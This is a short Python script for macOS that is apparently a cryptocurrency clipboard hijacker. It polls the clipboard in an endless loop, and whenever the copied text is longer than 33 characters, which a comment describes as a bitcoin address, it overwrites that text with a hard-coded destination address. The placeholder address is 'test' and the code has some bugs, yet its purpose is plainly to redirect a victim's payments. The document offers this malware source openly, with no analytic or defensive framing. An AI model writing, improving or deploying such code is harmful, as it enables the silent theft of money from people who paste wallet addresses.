import subprocess

destination_address = "test"

# for Mac

def get_clipboard():
    p = subprocess.Popen(["pbpaste"], stdout=subprocess.PIPE) # access clipboard
    data = str(p.stdout.read()) # read data im clipboard and convert to string
    if len(data) > 33: # bitcoin address
        swap_address(data)

def swap_address(data):
    p = subprocess.Popen(["pbcopy"], stdin=subprocess.PIPE) # access clipboard
    p.stdin.write(destination_address) # write destination address
    p.stdin.close()

while True:
    get_clipboard()